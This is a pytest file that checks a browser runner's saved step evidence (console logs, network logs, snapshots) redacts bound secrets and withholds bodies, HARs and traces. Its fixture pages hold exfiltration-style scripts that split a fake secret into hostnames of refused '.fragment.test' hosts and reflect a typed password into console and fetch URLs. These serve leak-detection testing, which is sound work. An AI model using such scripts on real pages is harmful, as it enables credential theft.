"""Evidence (#50 B; ADR-0026, Evidence, and its #50 B amendment): what a run
keeps of each step under `evidence/<seq>/` in the record it is given, what it
leaves out, and what saving it never changes. The browser tests launch real
Chromium on the OS that runs them: Linux in CI, macOS locally."""

import asyncio
import json
import time
from base64 import b64encode
from collections.abc import Iterator
from contextlib import suppress
from dataclasses import dataclass, replace
from pathlib import Path
from typing import Any
from urllib.parse import quote, quote_plus

import pytest
from aqa_core.config import ProjectConfig
from aqa_runner.document_origins import PolicyEvent, PolicyEventError
from aqa_runner.evidence import capture_evidence
from aqa_runner.redaction import Redacted, Redactor
from aqa_runner.run_record import RunRecord
from aqa_runner.snapshot_refs import LEFT_OUT
from playwright.async_api import Error

from packages.runner.tests import document_fixtures
from packages.runner.tests.document_fixtures import ref_for, until
from packages.runner.tests.executor_fixtures import (
    FORM_TARGETS,
    PAGES,
    App,
    Run,
    a_spec,
    by_role,
    compiled,
    run,
    serving_app,
)
from packages.runner.tests.reflection_fixtures import reflecting
from packages.runner.tests.result_redaction_fixtures import browsing, fake_secret
from packages.runner.tests.secret_fixtures import FAKE_VALUE, copies, secret_spec

# A fake value whose percent-encoding and base64 differ from it.
REFLECTED = "fake token/value"
MARKER = "[SECRET:FAKE_TOKEN]"

# A fake value a page splits across console messages, request methods and
# refused hosts with ports, each piece too short for any scan to find.
PIECES = ("fake", "spl1t", "va1ue")
SPLITTING = """(pieces) => pieces.forEach((piece, index) => {
    console.log(piece);
    fetch('/did/method', {method: piece});
    fetch(`http://${piece}.fragment.test:${4101 + index}/`).catch(() => null);
})"""
SPLIT = [f"{piece}.fragment.test:{4101 + index}" for index, piece in enumerate(PIECES)]

# What a step's evidence holds, by file, and what a run that binds a secret
# keeps of each log entry.
FILES = ("a11y_snapshot.yaml", "console_log.json", "network_log.json")
WITHHELD = ({("type",)}, {("size", "status", "timing")})


@pytest.fixture
def app() -> Iterator[App]:
    with serving_app() as served:
        yield served


def saved(record: Path) -> dict[str, bytes]:
    """Every file under `record`, by its path there."""
    return {
        path.relative_to(record).as_posix(): path.read_bytes()
        for path in sorted(record.rglob("*"))
        if path.is_file()
    }


def logs(files: dict[str, bytes], folder: str) -> list[list[dict[str, Any]]]:
    """The console log's and the network log's entries in `folder`."""
    return [
        json.loads(files[f"{folder}/{name}"])["entries"]
        for name in ("console_log.json", "network_log.json")
    ]


def kinds(entries: list[dict[str, Any]]) -> set[tuple[str, ...]]:
    """The sets of keys `entries` hold."""
    return {tuple(sorted(entry)) for entry in entries}


def holding(files: dict[str, bytes], texts: list[str]) -> list[str]:
    """Each of `texts` some file holds."""
    return [text for text in texts for data in files.values() if text.encode() in data]


def test_console_entries_and_the_network_log_show_the_marker(app: App) -> None:
    redactor = Redactor([fake_secret("FAKE_TOKEN", REFLECTED, app.origin)])

    async def scenario() -> tuple[list[str], list[str], int, list[str]]:
        async with browsing(app, redactor) as session:
            loaded = await session.navigate(f"{app.origin}/page/start")
            await session.page.evaluate("console.log('before')")
            await until(lambda: session.console_log(loaded).total == 1)
            window = await session.press("a")
            await session.page.evaluate(
                """(value) => {
                    console.log(value);
                    console.log(encodeURIComponent(value));
                    console.log(btoa(value));
                    console.log('x'.repeat(1990) + value);
                    for (let index = 0; index < 101; index++) console.log('more');
                    fetch('/did/' + encodeURIComponent(value));
                }""",
                REFLECTED,
            )
            await until(
                lambda: (
                    session.console_log(window).total == 105
                    and bool(window.responses.kept)
                )
            )
            logged = session.console_log(window)
            return (
                [entry.text for entry in session.console_log(loaded).kept],
                [entry.text for entry in logged.kept],
                logged.total,
                [entry.url for entry in await session.network_log(window)],
            )

    before, texts, total, urls = asyncio.run(scenario())

    assert before == ["before"]
    assert texts[:4] == [MARKER, MARKER, MARKER, ("x" * 1990 + MARKER)[:2000]]
    assert (len(texts), total) == (100, 105)
    assert urls == [f"{app.origin}/did/{MARKER}"]
    assert [
        copy for copy in copies(REFLECTED) for text in texts + urls if copy in text
    ] == []


@pytest.mark.parametrize("bound", [True, False], ids=["bound", "control"])
def test_a_run_that_binds_a_secret_saves_no_url_method_or_console_text(
    app: App, tmp_path: Path, bound: bool
) -> None:
    secrets = [fake_secret("FAKE_SPLIT", "".join(PIECES), app.origin)] if bound else []
    redactor = Redactor(secrets)
    record = RunRecord.create(tmp_path).redacting(redactor)
    # An attempt's part, as #53 makes one: the record's scan comes with it.
    part = replace(record, path=record.path / "attempt-1")

    async def scenario() -> None:
        async with browsing(app, redactor) as session:
            await session.navigate(f"{app.origin}/page/start")
            window = await session.press("a")
            await session.page.evaluate(SPLITTING, list(PIECES))
            await until(
                lambda: (
                    session.console_log(window).total >= 3
                    and window.requests.total == 6
                    and not window.open
                )
            )
            unscanned = RunRecord(record.run_id, record.path)
            with pytest.raises(ValueError, match="redactor"):
                await capture_evidence(unscanned, session, 1, window, None)
            await capture_evidence(part, session, 1, window, await session.snapshot())

    asyncio.run(scenario())

    files = saved(record.path)
    assert sorted(files) == [f"attempt-1/evidence/1/{name}" for name in FILES]
    console, network = logs(files, "attempt-1/evidence/1")
    # Chromium's own entries for the refused and failed loads come too.
    assert (len(console) > 3, len(network)) == (True, 6)
    if bound:
        assert (kinds(console), kinds(network)) == WITHHELD
        assert holding(files, [*PIECES, *SPLIT]) == []
    else:
        assert {entry["text"] for entry in console} >= set(PIECES)
        assert {str(entry["url"]).split("/")[2] for entry in network} >= set(SPLIT)
        assert {entry["method"] for entry in network} >= set(PIECES)
        assert (kinds(console), kinds(network)) == (
            {("text", "type")},
            {("method", "size", "status", "timing", "url")},
        )
        assert any(e["size"] and e["timing"]["duration_ms"] for e in network)


def test_capturing_evidence_changes_no_observation_a_caller_takes(
    app: App, tmp_path: Path
) -> None:
    redactor = Redactor([])

    async def observed(capture: bool) -> tuple[list[Redacted], bool]:
        record = RunRecord.create(tmp_path).redacting(redactor)
        async with browsing(app, redactor) as session:
            window = await session.navigate(f"{app.origin}/page/start")
            seen = [await session.snapshot()]
            if capture:
                await capture_evidence(record, session, 0, window, seen[-1])
            link = await session.locate(ref_for(seen[-1], "link", "Form"))
            window = await session.click(link)
            await session.settle(window)
            seen.append(await session.snapshot())
            if capture:
                await capture_evidence(record, session, 1, window, None)
            await session.locate(ref_for(seen[-1], "textbox", "Name"))
            # The control: a snapshot of the same page numbers its refs anew.
            renumbered = await session.snapshot() != seen[-1]
            return seen, renumbered

    with_evidence, _ = asyncio.run(observed(capture=True))
    without, renumbered = asyncio.run(observed(capture=False))

    assert with_evidence == without
    assert renumbered


def test_an_evidence_read_refuses_like_any_other_but_records_nothing(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    with reflecting(monkeypatch) as sites:
        redactor = Redactor([fake_secret("FAKE_TOKEN", REFLECTED, sites.app)])
        record = RunRecord.create(tmp_path).redacting(redactor)

        async def scenario() -> tuple[
            str, PolicyEventError, int, PolicyEventError, int
        ]:
            async with document_fixtures.browsing(sites, redactor=redactor) as session:
                window = await session.navigate(f"{sites.app}/reflect")
                pruned = await session.snapshot(record_refusal=False)
                # The page's own navigation, which no session check stops.
                with suppress(Error):
                    await session.page.goto(f"{sites.cdn}/canary")
                with pytest.raises(PolicyEventError) as quiet:
                    await session.snapshot(record_refusal=False)
                unrecorded = session.policy_events.total
                with pytest.raises(PolicyEventError) as loud:
                    await session.snapshot()
                await capture_evidence(record, session, 1, window, None)
                return (
                    pruned,
                    quiet.value,
                    unrecorded,
                    loud.value,
                    session.policy_events.total,
                )

        pruned, quiet, unrecorded, loud, recorded = asyncio.run(scenario())

    assert "fake-off-origin-canary" not in pruned
    assert LEFT_OUT in pruned
    assert (unrecorded, recorded) == (0, 1)
    assert (
        quiet.event
        == loud.event
        == PolicyEvent("document", f"{sites.cdn}/canary", sites.cdn)
    )
    assert sites.cdn in str(quiet)
    files = saved(record.path)
    assert sorted(files) == [f"evidence/1/{name}" for name in FILES[1:]]
    assert holding(files, [str(quiet), "cdn.example.test"]) == []


HOSTILE = """<form method="post" action="/write/signin" accept-charset="utf-8">
    <label>Password <input type="password" name="password"></label>
    <input type="hidden" name="canary" value="fake-request-body-canary">
    <button>Sign in</button>
</form><p id="seen"></p><script>
fetch('/page/evidence-response').then((response) => response.text());
document.querySelector('[name=password]').addEventListener('input', (event) => {
    const value = event.target.value;
    const utf8 = String.fromCharCode(...new TextEncoder().encode(value));
    document.querySelector('#seen').textContent = [
        value, encodeURIComponent(value).toLowerCase(), btoa(value), btoa(utf8),
    ].join(' | ');
    console.log(value);
    fetch('/did/' + encodeURIComponent(value));
});
</script>"""
TARGETS = {
    "password": {
        "semantic": "the password field",
        "locators": [{"css": "[name=password]"}],
    },
    "sign_in": {
        "semantic": "the sign-in button",
        "locators": [by_role("button", "Sign in")],
    },
    "never": {"semantic": "a button that never comes", "locators": [{"css": "#never"}]},
}
SIGNING_IN = [
    {
        "seq": 1,
        "action": "fill_secret",
        "target": "password",
        "secret": "TEST_PASSWORD",
        "side_effect": False,
    },
    {
        "seq": 2,
        "action": "click",
        "target": "sign_in",
        "side_effect": True,
        "side_effect_basis": "network: POST /write/signin",
    },
    {"seq": 3, "action": "click", "target": "never", "side_effect": False},
]


@dataclass
class Hostile:
    """A replay that signs in on a page reflecting the value, its app, and
    every file its record holds."""

    done: Run
    app: App
    files: dict[str, bytes]


@pytest.fixture(scope="module")
def hostile(tmp_path_factory: pytest.TempPathFactory) -> Iterator[Hostile]:
    tmp_path = tmp_path_factory.mktemp("hostile")
    with pytest.MonkeyPatch.context() as patch, serving_app() as app:
        patch.setenv("AQA_SECRET_TEST_PASSWORD", FAKE_VALUE)
        patch.setitem(PAGES, "evidence-hostile", HOSTILE)
        patch.setitem(PAGES, "evidence-response", "<p>fake-response-body-canary</p>")
        spec = secret_spec(tmp_path, start_url="/page/evidence-hostile")
        done = run(app, tmp_path, compiled(SIGNING_IN, targets=TARGETS), spec=spec)
        yield Hostile(done, app, saved(done.record.path))


def test_the_run_record_holds_only_the_steps_and_each_steps_evidence(
    hostile: Hostile,
) -> None:
    steps = [step.outcome for step in hostile.done.result.steps]
    files = hostile.files

    assert steps == ["completed", "completed", "completed", "drifted"]
    assert sorted(files) == sorted(
        [
            "steps.jsonl",
            *(f"evidence/{seq}/{name}" for seq in range(4) for name in FILES),
        ]
    )
    assert logs(files, "evidence/3") == [[], []]
    assert (
        kinds(logs(files, "evidence/1")[0]),
        kinds(logs(files, "evidence/1")[1]),
    ) == WITHHELD


def test_no_saved_file_is_a_body_a_har_or_a_trace(hostile: Hostile) -> None:
    posted = [body for path, body in hostile.app.bodies if path == "/write/signin"]

    assert [
        (b"fake-request-body-canary" in body, quote_plus(FAKE_VALUE).encode() in body)
        for body in posted
    ] == [(True, True)]
    assert "/page/evidence-response" in hostile.app.paths()
    for name, data in hostile.files.items():
        assert b"fake-request-body-canary" not in data, name
        assert b"fake-response-body-canary" not in data, name
        assert not data.startswith(b"PK\x03\x04"), name
        if name.endswith(".json"):
            assert "log" not in json.loads(data), name


def test_after_a_reflecting_replay_no_saved_file_holds_a_copy_of_the_value(
    hostile: Hostile,
) -> None:
    every = [
        *copies(FAKE_VALUE),
        quote(FAKE_VALUE, safe="").lower(),
        b64encode(FAKE_VALUE.encode("latin-1")).decode(),
    ]

    assert b"[SECRET:TEST_PASSWORD]" in hostile.files["evidence/1/a11y_snapshot.yaml"]
    assert [
        (name, copy)
        for name, data in hostile.files.items()
        for copy in every
        if copy.encode() in data
    ] == []


def test_a_page_that_stops_answering_leaves_its_snapshot_out_within_the_budget(
    app: App, tmp_path: Path
) -> None:
    config = ProjectConfig.model_validate({"budgets": {"resolve_seconds": 1}})
    fill = {
        "seq": 1,
        "action": "fill",
        "target": "name",
        "value": "Ada",
        "side_effect": False,
    }
    spec = a_spec(tmp_path, config, start_url="/page/stall")
    started = time.monotonic()

    done = run(
        app, tmp_path, compiled([fill], targets=FORM_TARGETS), config=config, spec=spec
    )

    assert [step.outcome for step in done.result.steps] == ["completed", "failed"]
    assert sorted(saved(done.record.path / "evidence" / "0")) == list(FILES)
    assert sorted(saved(done.record.path / "evidence" / "1")) == list(FILES[1:])
    assert time.monotonic() - started < 20


def test_a_replay_that_binds_but_never_fills_a_secret_withholds_its_logs(
    app: App, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The page splits the bound value, and sends it whole as a refused host.
    value = "".join(PIECES)
    monkeypatch.setenv("AQA_SECRET_TEST_PASSWORD", value)
    whole = f"fetch('http://{value}.fragment.test:4100/').catch(() => null)"
    split = f"<script>({SPLITTING})({json.dumps(list(PIECES))}); {whole}</script>"
    monkeypatch.setitem(PAGES, "evidence-split", split)
    spec = secret_spec(tmp_path, start_url="/page/evidence-split")

    done = run(app, tmp_path, compiled([]), spec=spec)

    window = done.result.steps[0].window
    assert window is not None
    assert {request.url.split("/")[2] for request in window.requests.kept} >= set(SPLIT)
    files = saved(done.record.path / "evidence")
    assert (kinds(logs(files, "0")[0]), kinds(logs(files, "0")[1])) == WITHHELD
    assert holding(files, [*PIECES, *SPLIT]) == []
    # The script fills nothing, so the egress record names hosts: scanned.
    egress = (done.record.path / "egress.json").read_text()
    refused = json.loads(egress)["refused"]
    assert {"host": "[SECRET:TEST_PASSWORD].fragment.test", "port": 4100} in refused
    assert value not in egress
